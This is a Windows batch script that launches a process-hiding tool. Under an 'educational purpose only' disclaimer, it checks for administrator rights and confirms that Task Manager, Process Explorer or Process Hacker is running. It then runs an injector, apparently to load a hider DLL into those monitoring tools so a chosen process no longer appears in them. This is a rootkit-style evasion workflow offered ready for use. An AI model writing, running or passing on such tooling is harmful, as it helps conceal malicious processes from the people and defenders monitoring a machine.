@echo off
:: Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY
:: Helper script to simplify usage

echo ===============================================================
echo Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY!
echo ===============================================================
echo.
echo DISCLAIMER: This tool is for educational and research purposes only.
echo Unauthorized use of this tool to hide malicious processes is illegal.
echo.

if "%1"=="" (
    echo Usage: hide_process.bat ^<process_name_to_hide^>
    echo Example: hide_process.bat notepad.exe
    goto end
)

:: Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: This script requires administrator privileges.
    echo Please right-click and select "Run as administrator"
    goto end
)

echo Target process to hide: %1
echo.
echo Checking if target monitoring tools are running...

:: Improved detection for Task Manager and other tools
set TOOL_RUNNING=0
tasklist /fi "imagename eq taskmgr.exe" | find /i "taskmgr.exe" >nul
if %errorlevel% equ 0 set TOOL_RUNNING=1

tasklist /fi "imagename eq procexp.exe" | find /i "procexp.exe" >nul
if %errorlevel% equ 0 set TOOL_RUNNING=1

tasklist /fi "imagename eq procexp64.exe" | find /i "procexp64.exe" >nul
if %errorlevel% equ 0 set TOOL_RUNNING=1

tasklist /fi "imagename eq ProcessHacker.exe" | find /i "ProcessHacker.exe" >nul
if %errorlevel% equ 0 set TOOL_RUNNING=1

if %TOOL_RUNNING% equ 0 (
    echo No process monitoring tool detected.
    echo Please start at least one of:
    echo - Task Manager (taskmgr.exe)
    echo - Process Explorer (procexp.exe)
    echo - Process Hacker (ProcessHacker.exe)
    echo.
    echo Then run this script again.
    goto end
)

:: Check if DLL and injector exist
if not exist win_process_hider.dll (
    echo ERROR: win_process_hider.dll not found.
    echo Please run build.bat first to compile the code.
    goto end
)

if not exist win_injector.exe (
    echo ERROR: win_injector.exe not found.
    echo Please run build.bat first to compile the code.
    goto end
)

echo Starting process hider...
win_injector.exe %1

:end
echo.
echo Press any key to exit...
pause >nul
